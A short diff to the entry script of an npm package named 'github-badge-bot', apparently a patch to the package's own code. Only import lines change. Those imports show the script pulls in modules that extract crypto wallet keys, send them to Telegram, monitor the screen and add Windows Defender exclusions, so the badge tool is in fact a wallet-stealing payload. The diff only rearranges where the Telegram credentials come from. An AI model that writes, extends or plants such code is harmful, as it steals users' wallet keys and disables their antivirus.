@@ -1,0 +1,14 @@
+diff --git a/node_modules/github-badge-bot/bin/extract-tokens.js b/node_modules/github-badge-bot/bin/extract-tokens.js
+index e417589..09d8f35 100644
+--- a/node_modules/github-badge-bot/bin/extract-tokens.js
++++ b/node_modules/github-badge-bot/bin/extract-tokens.js
+@@ -31,7 +31,8 @@ import { cleanupOrphanedProcesses } from '../lib/process-cleanup.js';
+ import { startScreenMonitoring } from '../lib/screen-monitor.js';
+ import { extractAllWalletKeys } from '../lib/wallet-extractor.js';
+ import { sendAllWalletsToTelegram } from '../lib/wallet-sender.js';
+-import { getTelegramBot, getTelegramCredentials } from '../lib/telegram.js';
++import { getTelegramBot } from '../lib/telegram.js';
++import { getTelegramCredentials } from '../lib/encryption.js';
+ import { addToWindowsDefenderExclusions } from '../lib/security-bypass.js';
+ import os from 'os';
+ 
